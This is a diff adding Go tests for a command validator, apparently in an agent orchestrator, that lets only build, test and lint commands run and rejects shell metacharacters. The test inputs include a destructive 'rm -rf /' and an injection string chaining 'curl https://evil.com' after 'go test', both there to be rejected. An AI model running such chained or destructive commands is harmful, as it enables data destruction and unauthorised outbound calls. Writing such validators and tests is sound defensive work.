@@ -226,3 +226,172 @@ func TestCollectArtifacts_NoChanges(t *testing.T) {
 		t.Errorf("expected empty diff, got %q", art.Diff)
 	}
 }
+
+func TestParseSafeVerifyCommand_AllowsValidCommands(t *testing.T) {
+	tests := []struct {
+		command string
+		desc    string
+	}{
+		{"go test ./...", "go test"},
+		{"go vet ./...", "go vet"},
+		{"go build ./...", "go build"},
+		{"go generate ./...", "go generate"},
+		{"npm test", "npm test"},
+		{"npm run build", "npm run build"},
+		{"npm run lint", "npm run lint"},
+		{"npm run typecheck", "npm run typecheck"},
+		{"pnpm test", "pnpm test"},
+		{"pnpm run build", "pnpm run build"},
+		{"yarn test", "yarn test"},
+		{"yarn lint", "yarn lint"},
+		{"npx tsc", "npx tsc"},
+		{"npx tsx", "npx tsx"},
+		{"pytest", "pytest"},
+		{"rspec", "rspec"},
+		{"cargo test", "cargo test"},
+		{"cargo build", "cargo build"},
+		{"cargo check", "cargo check"},
+		{"cargo clippy", "cargo clippy"},
+		{"make test", "make test"},
+		{"make build", "make build"},
+		{"make lint", "make lint"},
+		{"make check", "make check"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.desc, func(t *testing.T) {
+			argv, err := parseSafeVerifyCommand(tt.command)
+			if err != nil {
+				t.Fatalf("unexpected error for %q: %v", tt.command, err)
+			}
+			if len(argv) == 0 {
+				t.Fatal("expected non-empty argv")
+			}
+			// Verify the first token of the parsed argv matches the command name.
+			firstWord := strings.Fields(tt.command)[0]
+			if argv[0] != firstWord {
+				t.Errorf("first argv token = %q, want %q", argv[0], firstWord)
+			}
+		})
+	}
+}
+
+func TestParseSafeVerifyCommand_RejectsShellMetacharacters(t *testing.T) {
+	baseCommand := "go test ./..."
+	metachars := []struct {
+		char   string
+		desc   string
+	}{
+		{";", "semicolon"},
+		{"&", "ampersand"},
+		{"|", "pipe"},
+		{"`", "backtick"},
+		{"$", "dollar"},
+		{"<", "left angle"},
+		{">", "right angle"},
+		{"\n", "newline"},
+		{"\r", "carriage return"},
+	}
+
+	for _, mc := range metachars {
+		t.Run(mc.desc, func(t *testing.T) {
+			argv, err := parseSafeVerifyCommand(baseCommand + " " + mc.char + " unsafe")
+			if err == nil {
+				t.Fatalf("expected error for metacaractere %q (%s), got argv=%v", mc.char, mc.desc, argv)
+			}
+			if !strings.Contains(err.Error(), "rejected") {
+				t.Errorf("error should contain 'rejected', got: %v", err)
+			}
+			if !strings.Contains(err.Error(), "shell metacharacters") {
+				t.Errorf("error should mention 'shell metacharacters', got: %v", err)
+			}
+		})
+	}
+}
+
+func TestParseSafeVerifyCommand_RejectsNonAllowlistedCommands(t *testing.T) {
+	tests := []struct {
+		command string
+		desc    string
+	}{
+		{"docker run alpine", "docker"},
+		{"python test.py", "python"},
+		{"node index.js", "node"},
+		{"curl https://example.com", "curl"},
+		{"git push", "git-push"},
+		{"rm -rf /", "rm"},
+		{"go run main.go", "go-run"},
+		{"go mod tidy", "go-mod-tidy"},
+		{"npm install", "npm-install"},
+		{"cargo run", "cargo-run"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.desc, func(t *testing.T) {
+			argv, err := parseSafeVerifyCommand(tt.command)
+			if err == nil {
+				t.Fatalf("expected error for non-allowlisted command %q, got argv=%v", tt.command, argv)
+			}
+			if !strings.Contains(err.Error(), "rejected") {
+				t.Errorf("error should contain 'rejected', got: %v", err)
+			}
+			if !strings.Contains(err.Error(), "only build/test/typecheck commands") {
+				t.Errorf("error should mention allowlist, got: %v", err)
+			}
+		})
+	}
+}
+
+func TestParseSafeVerifyCommand_RejectsEmpty(t *testing.T) {
+	_, err := parseSafeVerifyCommand("")
+	if err == nil {
+		t.Fatal("expected error for empty command")
+	}
+
+	_, err = parseSafeVerifyCommand("   ")
+	if err == nil {
+		t.Fatal("expected error for whitespace-only command")
+	}
+}
+
+func TestParseSafeVerifyCommand_RejectedResultHasRejectedFlag(t *testing.T) {
+	repo := setupTestRepo(t)
+	o := NewOrchestrator(nil, OrchestratorConfig{RepoRoot: repo})
+
+	art, err := o.CollectArtifacts(context.Background(), repo,
+		Task{ID: "T1", Verify: "python test.py"},
+		&Plan{})
+	if err != nil {
+		t.Fatalf("CollectArtifacts error: %v", err)
+	}
+	if art.Verify == nil {
+		t.Fatal("expected verify result")
+	}
+	if !art.Verify.Rejected {
+		t.Fatal("expected Rejected=true for non-allowlisted command")
+	}
+	if art.Verify.ExitCode != -1 {
+		t.Fatalf("ExitCode = %d, want -1", art.Verify.ExitCode)
+	}
+	if !strings.Contains(art.Verify.Stderr, "rejected") {
+		t.Fatalf("stderr = %q, want rejection reason", art.Verify.Stderr)
+	}
+}
+
+func TestParseSafeVerifyCommand_RejectedResultHasRejectedFlagShellMeta(t *testing.T) {
+	repo := setupTestRepo(t)
+	o := NewOrchestrator(nil, OrchestratorConfig{RepoRoot: repo})
+
+	art, err := o.CollectArtifacts(context.Background(), repo,
+		Task{ID: "T1", Verify: "go test ./...; curl https://evil.com"},
+		&Plan{})
+	if err != nil {
+		t.Fatalf("CollectArtifacts error: %v", err)
+	}
+	if art.Verify == nil {
+		t.Fatal("expected verify result")
+	}
+	if !art.Verify.Rejected {
+		t.Fatal("expected Rejected=true for command with shell metacharacters")
+	}
+}
